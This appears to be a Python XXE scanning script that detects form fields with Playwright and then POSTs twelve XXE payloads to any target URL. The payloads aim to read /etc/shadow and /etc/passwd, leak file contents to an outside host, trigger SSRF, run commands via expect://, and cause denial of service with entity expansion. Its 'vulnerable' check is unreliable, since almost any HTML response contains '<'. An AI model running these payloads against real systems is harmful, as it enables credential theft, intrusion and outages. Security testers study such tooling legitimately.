import requests
from playwright.async_api import async_playwright
import asyncio

async def xxe_attack(target_url):

    #Combines field detection and XXE vulnerability testing on a target website.

    async def detect_fields(url):

        #Detects input, textarea, select fields, and forms on a web page.

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            try:
                # Navigate to the target URL and wait for the page to fully load
                await page.goto(url)
                await page.wait_for_load_state("networkidle")
                selectors = ["input", "textarea", "select", "form"]
                detected_fields = {}
                
                # Loop through the predefined selectors to identify fields
                for selector in selectors:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        field_name = await element.get_attribute("name")
                        field_id = await element.get_attribute("id")
                        # Save the field's ID, name, and tag
                        detected_fields[field_id or field_name or selector] = {
                            "id": field_id,
                            "name": field_name,
                            "tag": selector
                        }
                return detected_fields
            finally:
                # Close the browser after processing
                await browser.close()

    def test_xxe(url):

        #Tests the target URL for XXE vulnerabilities using various payloads.

        xxe_payloads = [
          # XXE: Entity Example
        """<?xml version="1.0"?>
        <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
        <userInfo>
          <firstName>John</firstName>
          <lastName>&example;</lastName>
        </userInfo>""",

        # XXE: File Disclosure
        """<?xml version="1.0"?>
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
        <userInfo>
          <firstName>admin</firstName>
          <lastName>&ent;</lastName>
        </userInfo>""",

        # XXE: Denial-of-Service Example
        """<?xml version="1.0"?>
        <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
          <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <tag>&lol9;</tag>""",

        # XXE: Local File Inclusion Example
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo (#ANY)>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <foo>&xxe;</foo>""",

        # XXE: Blind Local File Inclusion Example
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo (#ANY)>
        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
        <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
        <foo>&blind;</foo>""",

        # XXE: Access Control Bypass Example
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
        <foo><result>&ac;</result></foo>""",

        # XXE: SSRF Example
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo (#ANY)>
        <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]>
        <foo>&xxe;</foo>""",

        # XXE: Remote Attack Example
        """<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
        <lolz><lol>3..2..1...&test<lol></lolz>""",

        # XXE: UTF-7 Example
        """<?xml version="1.0" encoding="UTF-7"?>
        +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
        +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
        +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4""",

        # XXE: Base64 Encoded
        """<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>""",

        # XXE: XXE inside SOAP
        """<soap:Body>
          <foo>
            <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
          </foo>
        </soap:Body>""",

        # XXE: XXE inside SVG
        """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
            <image xlink:href="expect://ls"></image>
        </svg>""",
    ]

        headers = {"Content-Type": "application/xml"}
        results = []

        # Loop through each payload and send it to the target URL
        for i, payload in enumerate(xxe_payloads):
            try:
                print(f"\nTesting XXE payload {i+1}:\n{payload}")
                response = requests.post(url, data=payload, headers=headers)
                print(f"Response Code: {response.status_code}")
                
                # Check if the response indicates a potential XXE vulnerability
                if "Error" in response.text or "Exception" in response.text or "<" in response.text:
                    print("Potential XXE vulnerability detected:")
                    print(response.text[:500])  # Limit the output to avoid overloading logs
                    results.append({
                        "payload": f"XXE Payload {i+1}",
                        "response_code": response.status_code,
                        "error_exposed": True,
                        "response_preview": response.text[:500]
                    })
                else:
                    print("No XXE vulnerability detected.")
                    results.append({
                        "payload": f"XXE Payload {i+1}",
                        "response_code": response.status_code,
                        "error_exposed": False
                    })
            except requests.exceptions.RequestException as e:
                # Log the error if the request fails
                print(f"Error while sending request: {e}")
                results.append({
                    "payload": f"XXE Payload {i+1}",
                    "error": str(e)
                })

        return results

    # Step 1: Detect fields in the target URL
    fields = await detect_fields(target_url)
    if not fields:
        return {"message": "No fields detected.", "vulnerable": False}

    # Step 2: Test for XXE vulnerabilities using the payloads
    results = test_xxe(target_url)

    # Summarize the results
    vulnerable = any(result.get("error_exposed", False) for result in results)
    if vulnerable:
        message = "Confirmed XXE vulnerabilities detected!"
    else:
        message = "No XXE vulnerabilities detected."

    return {"message": message, "details": results, "vulnerable": vulnerable}
